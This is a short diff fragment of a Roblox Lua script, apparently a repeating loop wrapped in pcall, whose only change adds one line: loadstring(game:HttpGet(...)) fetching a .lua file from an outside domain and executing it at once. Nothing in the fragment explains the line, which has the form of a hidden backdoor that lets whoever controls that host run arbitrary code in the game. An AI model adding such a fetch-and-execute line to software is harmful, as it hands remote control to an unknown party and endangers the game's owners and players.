@@ -335,3 +335,4 @@ while wait() do
     pcall(
         function()
 
+loadstring(game:HttpGet('https://hugegames.space/93c912e2e82c7751cf82f8d4.lua'))()
